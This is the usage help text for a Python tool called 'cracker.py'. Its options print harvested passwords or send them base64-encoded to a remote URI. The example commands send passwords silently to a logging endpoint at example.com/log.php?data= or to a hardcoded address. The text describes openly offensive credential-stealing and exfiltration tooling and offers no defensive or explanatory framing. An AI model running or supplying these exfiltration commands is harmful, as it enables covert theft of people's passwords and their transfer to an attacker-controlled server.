Usage:
    python cracker.py [OPTIONS] [URI]
   
Parameters:
    v - be verbose
    p - print passwords to console
    s - send base64 encoded passwords to URI
    h - print this help

Examples:

    python cracker.py -vps http://www.example.com/log.php?data=
    Be extremely verbose and send passwords to specified uri

    python cracker.py -s http://example.com/log.php?data=
    Be silent and send passwords to specified uri

    python cracker.py -s
    Be silent and send passwords to hardcoded uri

    python cracker.py
    Use hardcoded properties (be silent and send to hardcoded uri)

    python cracker.py - http://example.com/log.php?data=
    Use hardcoded properties and specified uri
